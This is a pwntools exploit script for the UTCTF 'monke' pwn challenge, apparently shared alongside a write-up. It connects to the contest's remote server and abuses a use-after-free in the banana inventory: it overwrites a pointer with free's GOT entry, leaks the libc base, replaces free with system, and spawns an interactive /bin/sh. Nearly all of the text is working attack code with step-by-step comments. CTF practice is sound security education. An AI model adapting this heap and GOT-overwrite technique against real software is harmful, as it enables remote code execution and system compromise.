#!/bin/env python

# explanation can be found at https://avalanche.surge.sh/post/utctf_monke
from pwn import *

#sh = gdb.debug("./monke", "b *0x000000000040088e")
elf = ELF("./monke")
# libc = ELF("/usr/lib/libc-2.33.so")
libc = ELF("./libc-2.27.so")

sh = elf.process()
sh = remote("pwn.utctf.live", 9999)

def skip_menu():
    global sh
    sh.recvuntil("2: inventory\n")
    return bool(sh.recvline(timeout=0.5))

def walk(where="s"):
    global sh
    sh.sendline("0")
    sh.sendlineafter("[n|s|e|w]", where)
    return skip_menu()


def find_banana(name, length):
    global sh
    while not walk():
        pass
    sh.sendline("3")
    sh.sendlineafter("How long would you like the name to be:", str(length))
    sh.sendlineafter("What would you like to name it:", name)
    skip_menu()


def eat(idx, end = False):
    sh.sendline("2")
    sh.recvline()
    while bool(sh.recvline(timeout=0.5)):
        pass
    sh.sendline(str(idx))
    sh.recvline()
    sh.sendline("eat")
    sh.recvline()
    if not end:
        skip_menu()

def rename(idx, name):
    sh.sendline("2")
    sh.recvline()
    while bool(sh.recvline(timeout=0.5)):
        pass
    sh.sendline(str(idx))
    sh.recvline()
    sh.sendline("rename")
    sh.recvline()
    sh.sendline(name)
    skip_menu()


# We need to call skip_menu once at the beginning.
skip_menu()

# We find the first banana and set it's name length to 4
find_banana("a", 4)
# We walk in to direction that doesn't exist.
walk("0")
# We eat the banana we collected.
eat(0)
# We find the first banana and set it's name length to 8
find_banana("b", 8)
# We rename the first banana with the got address of free
rename(0, p64(elf.got["free"]))
sh.sendline("s")
skip_menu()

# We display inventory in order to leak free address
sh.sendline("2")
sh.recvline()
sh.recvline()
free = u64(sh.recvline()[3:].strip().ljust(8, b"\x00"))

# We calculate the base address of libc
libc.address = free - libc.symbols["free"]
log.info(f"libc base leaked @ 0x{libc.address:x}")

# We rename the first banana giving te addres of system as name
sh.sendline("1")
sh.recvline()
sh.sendline("rename")
sh.recvline()
sh.sendline(p64(libc.symbols["system"]))
skip_menu()
sh.sendline("s")
skip_menu()

# We find another banana and name it /bin/sh and then eat it
find_banana("/bin/sh", 10)
eat(2, True)
sh.interactive()
